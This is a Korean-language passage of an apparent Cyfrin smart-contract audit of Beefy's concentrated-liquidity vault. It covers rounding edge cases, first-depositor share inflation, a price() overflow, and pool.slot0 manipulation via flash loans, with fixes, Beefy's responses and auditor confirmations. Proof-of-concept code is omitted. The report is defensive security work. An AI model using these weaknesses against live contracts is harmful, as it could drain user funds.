이 패턴은 유동성이 제거되지만 다시 유동성을 추가하기 전에 `_setTicks`가 호출되지 않는 `StrategyPassiveManagerUniswap::withdraw` [L204](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L204) 내부에서는 발생하지 않습니다.

다음 시나리오를 고려하십시오:

1. Beefy는 현재 틱을 기준으로 LP 포지션을 설정합니다.
2. 다른 사용자가 Uniswap 풀에서 거래하여 현재 유동성 범위를 Beefy의 LP 범위 밖으로 이동시킵니다.
3. 누군가 Beefy 프로토콜과 상호 작용합니다. 거의 모든 상호 작용에서 Beefy는 유동성을 제거하고 현재 틱을 가져와 현재 틱에서 계산된 새로운 유동성 범위를 배포합니다.
4. 그러나 인출 시 Beefy는 유동성을 제거하지만 새로운 현재 틱을 가져오지 않으므로 오래된 저장된 현재 틱 데이터를 사용하여 새로운 유동성 범위를 배포합니다.

위의 시나리오에서 Beefy는 다른 사용자의 활동으로 인해 실제 현재 범위가 그 밖으로 이동했기 때문에 보상을 받지 못하는 영역에 새로운 LP 범위를 배포할 수 있습니다.

**영향:** 인출이 발생할 때마다 새로 추가된 유동성은 오래된 현재 틱을 기반으로 할 수 있습니다. 이에 대한 가장 가능성 있는 결과는 최적이 아닌 LP 포지션으로 인한 유동성 공급자 보상 감소입니다.

**권장 완화 방법:** `StrategyPassiveManagerUniswap::withdraw`는 `_addLiquidity`를 호출하기 전에 `_setTicks`를 호출해야 합니다.

**Beefy:**
사용자가 언제든지 인출할 수 있도록 커밋 [be0f1ea](https://github.com/beefyfinance/experiments/commit/be0f1eac6944d6f8f73d74a8c3ec80ae3bc3d089)에서 `withdraw`에서 `_onlyCalmPeriods` 확인을 제거하기로 결정했습니다. 따라서 악의적인 행위자가 우리가 불리한 범위에 유동성을 배포하도록 강제할 수 없도록 인출이 틱을 설정할 수 있기를 원하지 않습니다.


### 첫 번째 예금자는 예금과 인출을 재활용하여 지분 수를 엄청나게 부풀릴 수 있음

**설명:** 첫 번째 예금자는 예금과 인출을 재활용하여 지분 수를 엄청나게 부풀릴 수 있습니다.

**영향:** 첫 번째 예금자는 엄청나게 부풀려진 지분 수를 갖게 됩니다. 그러나 후속 예금자도 많은 지분 수를 갖게 되므로 이를 악용하여 후속 예금자로부터 토큰을 훔칠 방법을 찾지 못했습니다.

**개념 증명 (Proof of Concept):** `test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol:`에 새로운 테스트 파일을 추가합니다.

(코드 생략 - 원본 참조)

실행: `forge test --match-path test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol --fork-url https://rpc.ankr.com/eth -vv`

**권장 완화 방법:** `BeefyVaultConcLiq::deposit` [L178-179](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L178-L179)에서 `token1EquivalentBalance` 계산을 재작업하십시오.

**Beefy:**
우리는 첫 번째 예금자의 지분 중 일부를 소각 주소로 보내기 때문에 이것이 의도한 대로 작동한다고 믿습니다.


### `StrategyPassiveManagerUniswap::price`는 크지만 유효한 `sqrtPriceX96`에 대해 오버플로로 인해 되돌려짐(revert)

**설명:** `sqrtPriceX96`의 최대값은 [1461446703485210103287273052203988822378723970342](https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/libraries/TickMath.sol#L16)이지만 `StrategyPassiveManagerUniswap::price`는 이보다 훨씬 낮은 값에 대해 오버플로로 인해 되돌려집니다.

**영향:** `StrategyPassiveManagerUniswap::price`에 의존하는 예금과 같은 기능은 되돌려져 서비스 거부를 초래합니다.

**개념 증명 (Proof of Concept):** 독립형 Foundry 퍼즈 테스트:

(코드 생략 - 원본 참조)

실행하면 오버플로가 표시됩니다:
```solidity
encountered 1 failing test in test/PriceTest.t.sol:PriceTest
[FAIL. Reason: panic: arithmetic underflow or overflow (0x11); counterexample:
calldata=0x4f3b91450000000000000000000000000000000100000000000000000000000000000000
args=[340282366920938463463374607431768211456 [3.402e38]]] test_price(uint160)
(runs: 3, μ: 1319, ~: 1421)
```

**권장 완화 방법:** `StrategyPassiveManagerUniswap::price`의 구현을 다시 생각해보십시오.

**Beefy:**
커밋 [4f061b1](https://github.com/beefyfinance/experiments/commit/4f061b18c0a99392770f68f8c6762fba3c096e97), [1ae1649](https://github.com/beefyfinance/experiments/commit/1ae16493d03417d63010fe034672876b2364c284)에서 수정되었습니다.

**Cyfrin:** 함수가 더 이상 되돌려지지 않음을 확인했습니다. 수정 사항은 이 독립형 상태 비저장 퍼즈 테스트에서 보여주는 것처럼 약간의 정밀도 손실을 유발합니다.

(코드 생략 - 원본 참조)


### 인출 시 양수의 지분을 소각하면서 0개의 토큰을 반환할 수 있음

**설명:** 불변 퍼징(Invariant fuzzing)은 사용자가 0보다 큰 양의 지분을 소각하지만 0개의 출력 토큰을 받을 수 있는 엣지 케이스를 발견했습니다. 원인은 `BeefyVaultConcLiq::withdraw` [L220-221](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L220-L221)에서 작은 `_shares` 값에 대한 0으로의 내림(rounding down) 정밀도 손실로 보입니다.

```solidity
uint256 _amount0 = (_bal0 * _shares) / _totalSupply;
uint256 _amount1 = (_bal1 * _shares) / _totalSupply;
```

**영향:** 프로토콜은 사용자가 지분을 소각하지만 대가로 0개의 출력 토큰을 받는 상태가 될 수 있습니다.

**개념 증명 (Proof of Concept):** 감사 종료 시 제공된 불변 퍼즈 테스트 스위트.

**권장 완화 방법:** 출력 토큰이 반환되지 않는 경우에도 되돌려지도록 슬리피지 확인을 변경하십시오:
```solidity
if (_amount0 < _minAmount0 || _amount1 < _minAmount1 ||
   (_amount0 == 0 && _amount1 == 0)) revert TooMuchSlippage();
```

**Beefy:**
커밋 [04acaee](https://github.com/beefyfinance/experiments/commit/04acaeecca9a69f0cc1399dac68da21fcf598f17)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.


### 사용자가 양수의 토큰을 입금할 때 예금 시 0 지분을 반환할 수 있음

**설명:** 상태 비저장 퍼징(Stateless fuzzing)은 사용자가 0보다 큰 양의 토큰을 입금하지만 0개의 출력 지분을 받을 수 있는 엣지 케이스를 발견했습니다. 원인은 소량으로 인한 지분 계산 [L179](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L179)에서의 0으로의 내림 정밀도 손실 또는 첫 번째 예금자의 최소 지분 금액 차감 [L182](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L182)과 이것이 발생한 후 0 지분 확인이 없는 것이 결합된 것으로 보입니다.

흥미롭게도 `BeefyVaultConcLiq::deposit`에는 0 지분이 발행되는 것을 방지하는 확인 [L173](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L173)이 있지만 이 확인이 발생한 후 지분 금액이 수정됩니다.

**영향:** 프로토콜은 사용자가 양수의 토큰을 입금하지만 대가로 0개의 출력 지분을 받는 상태가 될 수 있습니다.

**개념 증명 (Proof of Concept):** 이 테스트 파일을 `test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol`에 추가하십시오:

(코드 생략 - 원본 참조)

실행: `forge test --match-path test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol --fork-url https://rpc.ankr.com/eth --fork-block-number 19410822 -vvv`

**권장 완화 방법:** 사용자에게 지분을 발행하기 전에 0 지분을 다시 확인하십시오.

**Beefy:**
커밋 [bee75ac](https://github.com/beefyfinance/experiments/commit/bee75ac2e2ec0d94093ee8f5c3361f98119604bc)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.


### 일부 토큰은 프로토콜에 영원히 갇히게 됨

**설명:** 첫 번째 예금자가 기부한 지분으로 인해 일부 토큰은 인출할 수 없게 되고 대신 프로토콜에 영원히 갇히게 됩니다.

**영향:** 일부 토큰은 프로토콜에 영구적으로 갇힙니다.

**권장 완화 방법:** 다음과 같은 프로토콜의 "수명 종료(end-of-life)" 상태를 구현하십시오:
1) `StrategyPassiveManagerUniswap`이 일시 중지되고 `BeefyVaultConcLiq::totalSupply == MINIMUM_SHARES`일 때(이 상태에서는 모든 사용자가 인출하고 유동성이 제거됨) 소유자만 호출할 수 있습니다.
2) 나머지 모든 토큰을 `StratFeeManagerInitializable::beefyFeeRecipient`로 보냅니다.
3) 더 이상 함수를 실행할 수 없도록 프로토콜을 "수명 종료" 상태로 만듭니다.

**Beefy:**
커밋 [b520517](https://github.com/beefyfinance/experiments/commit/b520517486fa88da062116f6327ee938dd0b4fb4)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.

\clearpage
## 정보성 (Informational)

### `pool.slot0` 사용은 쉽게 조작될 수 있음

**설명:** `StrategyPassiveManagerUniswap::sqrtPrice`는 `pool.slot0`을 [사용하여](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L544) 현재 틱과 현재 가격을 가져옵니다.

이 가격은 `_addLiquidity` [L217](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L217), `_checkAmounts` [L283](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L283), `balancesOfPool` [L452](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L452), `_setAltTick` [L601](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L601) 및 `price` [L535](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L535)와 같은 여러 함수와 `BeefyVaultConcLiq::previewDeposit` [L117](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L117) 및 `deposit` [L170](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L170)에서 사용되는 반면 현재 틱은 LP 범위를 계산하는 데 사용됩니다.

`pool.slot0`은 플래시 론을 통해 임의의 가치 가격과 틱 값을 반환하도록 [쉽게 조작될 수 있습니다](https://solodit.xyz/issues/h-10-ichilporacle-is-extemely-easy-to-manipulate-due-to-how-ichivault-calculates-underlying-token-balances-sherlock-blueberry-blueberry-git). Beefy의 경우 이를 통해 공격자는 프로토콜이 불리한 범위에 유동성을 배포하도록 강제할 수 있습니다.

Beefy는 이 위험을 인지하고 있으며 풀이 갑자기 조작된 경우 많은 기능이 작동하지 않도록 하는 [`_onlyCalmPeriods`](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L96-L102) 함수를 구현했습니다. 그러나 우리의 중대한 발견 사항에서 알 수 있듯이 `_onlyCalmPeriods` 구현의 비대칭성은 프로토콜이 고갈되는 결과를 초래할 수 있습니다.

따라서 우리는 이 코드베이스가 계속 발전함에 따라, 특히 현재 틱에서 LP 범위를 설정하고 프로토콜의 유동성을 배포하는 함수와 관련하여 `pool.slot0` 사용을 위험으로 기록합니다.

**Beefy:**
인정됨.


### `StrategyPassiveManagerUniswap::twapInterval`은 `uint32`여야 함

**설명:** `twapInterval`이 시간 간격에 해당한다는 점을 감안할 때 `uint32`로 정의하는 것이 더 합리적이며, `setTwapInterval`을 통한 잘못된 할당 가능성을 피하여 `twap()`의 동작에 영향을 줄 수 있습니다.

**Beefy:**
커밋 [b520517](https://github.com/beefyfinance/experiments/commit/b520517486fa88da062116f6327ee938dd0b4fb4)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.


### `StrategyPassiveManagerUniswap::setTwapInterval`에서 위험한 할당을 피하기 위해 최소 TWAP 간격 강제 고려

**설명:** UniswapV3에서 TWAP 오라클이 작동하는 방식은 다음과 같습니다:

$$tickCumulative(pool,time_{A},time_{B}) = \sum_{i=time_{A}}^{time_{B}} Price_{i}(pool)$$

$$TWAP(pool,time_{A},time_{B}) = \frac{tickCumulative(pool,time_{A},time_{B})}{time_{B} - time_{A}}$$

이 방식에서 $time_{B} - time_{A}$가 너무 낮으면 TWAP 출력을 조작하기가 상대적으로 쉽습니다. $time_{B} - time_{A}$는 `twapInterval`로 표시되므로 최소값, 예를 들어 5분(현재 이더리움 블록 방출 속도가 약 12초임을 고려)을 강제하는 것이 좋습니다.

**Beefy:**
커밋 [b5769c4](https://github.com/beefyfinance/experiments/commit/b5769c4ccad6357ac9d3de2c682749bbaeeae6d1)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.


### `StrategyPassiveManagerUniswap::_setAltTick`에서 기존 `price` 함수 사용

**설명:** `StrategyPassiveManagerUniswap`에는 uniswap `pool.slot0`이 반환한 `sqrtPriceX96`을 [변환](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L534-L537)하는 `price` 함수가 있습니다.

`_setAltTick` [L601-604](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L601-L604)를 리팩토링하여 기존 `price` 함수를 사용하도록 하여 코드 중복과 여러 곳에서 동일한 기능을 구현할 때 오류가 발생할 가능성을 줄이십시오:

```solidity
if (bal0 > 0) {
    amount0 = bal0 * price() / PRECISION;
}
```

또한 이를 통해 `_setAltTick` 내부의 `price1` 변수 선언을 제거할 수 있습니다.

**Beefy:**
커밋 [b5b609e](https://github.com/beefyfinance/experiments/commit/b5b609ec38938b15dc20a5ac187111019b82ebc5)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.


### `BeefyVaultConcLiq::balances`에서 기존 `available` 함수 사용

**설명:** `BeefyVaultConcLiq`에는 볼트 계약이 보유한 토큰 잔액을 [반환](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L91-L94)하는 `available` 함수가 있습니다.

`balances` [L81-83](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L81-L83)을 리팩토링하여 기존 `available` 함수를 사용하도록 하여 코드 중복과 여러 곳에서 동일한 기능을 구현할 때 오류가 발생할 가능성을 줄이십시오.

가능한 리팩토링 중 하나:
```solidity
(uint256 stratBal0, uint256 stratBal1) = IStrategyConcLiq(strategy).balances();
(uint256 vaultBal0, uint256 vaultBal1) = available();
return (stratBal0 + vaultBal0, stratBal1 + vaultBal1);
```

**Beefy:**
커밋 [38ee643](https://github.com/beefyfinance/experiments/commit/38ee643ab661aba48f73b673ef2c8ed5ac63ed00)에서 우리는 available 함수를 제거하고 볼트 잔액을 제외했습니다. 왜냐하면 예금이나 인출 기능에서 설명되지 않기 때문입니다. 어떤 이유로 누군가 볼트 계약으로 토큰을 보내는 경우 소유자 함수에 의해 구조될 수 있습니다.


### 반환된 가격이 확장(scaled up)되었음을 명시적으로 나타내기 위해 `StrategyPassiveManagerUniswap::price`를 `scaledUpPrice`로 이름 변경

**설명:** `price` 함수의 현재 구현은 확장된 가격을 반환하지만 함수 이름은 이를 나타내지 않습니다. 이 함수를 사용하는 코드의 다른 곳에서는 가격을 축소하지만, 위험은 프로토콜이 계속 발전함에 따라 미래에 다른 개발자가 반환된 가격이 확장되었음을 인식하지 못하고 `price` 함수를 호출하여 축소하지 않을 수 있다는 것입니다.

**권장 완화 방법:**
함수 호출자에게 축소해야 함을 명시적으로 알리기 위해 함수 이름을 `scaledUpPrice`로 변경하십시오.

**Beefy:**
커밋 [319cfa0](https://github.com/beefyfinance/experiments/commit/319cfa013263bdab8790bebaa041737e30f52c3b)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.


### `OwnableUpgradeable` 대신 `Ownable2StepUpgradeable`, `Ownable` 대신 `Ownable2Step` 사용

**설명:** `StratFeeManagerInitializable` 및 `BeefyVaultConcLiq`는 `OwnableUpgradeable` 대신 `Ownable2StepUpgradeable`을 사용해야 합니다.

`StrategyFactory`는 `Ownable` 대신 `Ownable2Step`을 사용해야 합니다.

[더 안전한](https://www.rareskills.io/post/openzeppelin-ownable2step) 소유권 이전을 위해 2단계 소유 가능 계약이 선호됩니다.

**Beefy:**
인정됨.


### 넓은 버전 대신 특정 버전의 Solidity 사용

**설명:** `StratFeeManagerInitializable`은 `pragma solidity ^0.8.23;` 대신 `pragma solidity 0.8.23;`을 사용해야 합니다.

**Beefy:**
인정됨.


### 내부적으로 사용되지 않는 `public` 함수는 `external`로 표시될 수 있음

**설명:** 내부적으로 사용되지 않는 `public` 함수는 `external`로 표시될 수 있습니다:

(코드 생략 - 원본 참조)

**Beefy:**
커밋 [139c3f9](https://github.com/beefyfinance/experiments/commit/139c3f9b1f77b78f87f3e1ffe08d79831979ee4e)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.

\clearpage
## 가스 최적화 (Gas Optimization)

### 변경되지 않고 여러 번 읽을 때 스토리지 변수를 메모리에 캐시

**설명:** 스토리지에서 읽는 것은 메모리에서 읽는 것보다 훨씬 비싸므로 변경되지 않고 여러 번 읽을 때 스토리지 변수를 메모리에 캐시하십시오:

(코드 생략 - 원본 참조)

**Beefy:**
인정됨.


### 생성자에서 한 번만 할당된 스토리지 변수는 불변(immutable)으로 선언될 수 있음

**설명:** 생성자에서 한 번만 할당된 스토리지 변수는 불변으로 선언될 수 있습니다:

(코드 생략 - 원본 참조)

**Beefy:**
인정됨.


### 루프 외부에서 배열 길이 캐시 및 unchecked 루프 증가 고려

**설명:** `solc --ir-optimized --optimize`로 컴파일하지 않는 경우 루프 외부에서 배열 길이를 캐시하고 `unchecked {++i;}` 사용을 고려하십시오:

(코드 생략 - 원본 참조)

**Beefy:**
인정됨.


### 불필요한 변수를 제거하고 중복 스토리지 읽기를 제거하기 위해 `StrategyPassiveManagerUniswap::_chargeFees` 최적화

**설명:** `StrategyPassiveManagerUniswap::_chargeFees`는 두 개의 불필요한 변수 `out0` 및 `out1`을 사용하고 `lpToken0`, `lpToken` 및 `native`에서 동일한 스토리지 값을 여러 번 읽습니다. 관련 섹션의 더 최적화된 버전은 다음과 같습니다:

(코드 생략 - 원본 참조)

**Beefy:**
인정됨.


### `StrategyPassiveManagerUniswap::_setMainTick`에서 `_tickDistance`를 두 번 호출하지 마십시오

**설명:** `StrategyPassiveManagerUniswap::_setMainTick`은 정확히 동일한 값이 반환되므로 필요하지 않음에도 불구하고 `_tickDistance`를 두 번 호출합니다. 두 번째 호출을 첫 번째 호출의 결과를 캐시하는 `distance` 변수로 교체하십시오:

(코드 생략 - 원본 참조)

**Beefy:**
커밋 [e7723da](https://github.com/beefyfinance/experiments/commit/e7723daf27d39ae013507191aa67e111f3af05e4)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.


### `StrategyPassiveManagerUniswap` 공개 함수는 공통 입력을 캐시한 다음 개인 함수에 매개변수로 전달해야 함

**설명:** `StrategyPassiveManagerUniswap`에는 스토리지를 변경하지 않고 여러 번 동일한 값을 읽는 많은 개인 함수가 있습니다. 스토리지에서 읽는 것은 가스 비용이 많이 들기 때문에 이러한 값은 스토리지에서 한 번 읽은 다음 입력 매개변수로 개인 함수에 전달될 수 있습니다.

예 1 - `StrategyPassiveManagerUniswap::_setMainTick` 및 `_setAltTick`은 동일한 입력 중 많은 것을 사용합니다. 스토리지에서 여러 번 읽는 대신 `_setTicks` 내부에서 한 번 읽은 다음 `_setMainTick, _setAltTick`에 입력 매개변수로 전달하십시오:

(코드 생략 - 원본 참조)

예 2 - `beforeAction`은 `_claimEarnings` 및 `_removeLiquidity`를 호출합니다. 이 두 개인 함수는 스토리지에서 `pool`, `positionMain` 및 `positionAlt`를 읽지만 이러한 스토리지 위치를 수정하지 않습니다. 따라서 `beforeAction`은 이러한 값을 스토리지에서 한 번 읽은 다음 쓸모없지만 비싼 많은 스토리지 읽기를 절약하기 위해 `_claimEarnings` 및 `_removeLiquidity`에 입력으로 전달할 수 있습니다.

**Beefy:**
커밋 [ce5f798](https://github.com/beefyfinance/experiments/commit/ce5f7986372cd2e32e58b1a03e0693d42b4b1ce0)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.


### `BeefyVaultConcLiq::deposit`에서 불필요한 0으로의 초기화 방지

**설명:** `BeefyVaultConcLiq::deposit`은 `shares` 변수가 [L172](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L172)에서 나중에 처음 사용됨에도 불구하고 [L127](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L157)에서 `shares` 변수를 0으로 초기화하여 선언합니다.

L172에서 `shares`를 선언하고 동시에 초기화하여 불필요한 0으로의 초기화를 피하십시오:
```solidity
uint256 shares = _amount1 + (_amount0 * price / PRECISION);
```

**Beefy:**
커밋 [ea3aca8](https://github.com/beefyfinance/experiments/commit/ea3aca890816ea86f84ab721e6aa8993a591f061)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.


### `BeefyVaultConcLiq:withdraw`에서 빠른 실패(Fail fast)

**설명:** `BeefyVaultConcLiq:withdraw`에서 `minAmount0` 및 `minAmount1` [슬리피지 확인](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L225)은 `strategy.withdraw` 호출 전에 있어야 합니다. 함수가 되돌려질 예정이라면 추가 처리를 수행할 필요가 없기 때문입니다. 다음과 같이 만드십시오:
```solidity
uint256 _amount0 = (_bal0 * _shares) / _totalSupply;
uint256 _amount1 = (_bal1 * _shares) / _totalSupply;

// @audit fail fast
if (_amount0 < _minAmount0 || _amount1 < _minAmount1) revert TooMuchSlippage();

strategy.withdraw(_amount0, _amount1);
```

**Beefy:**
인정됨.


### 변경되지 않는 함수 인수에 대해 `memory` 대신 `calldata` 사용

**설명:** 변경되지 않는 함수 인수에 대해 `memory` 대신 `calldata`를 사용하십시오:

(코드 생략 - 원본 참조)

**Beefy:**
커밋 [8349866](https://github.com/beefyfinance/experiments/commit/8349866c048412ec4c395eb0666b9e5aad6d6447)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.

\clearpage
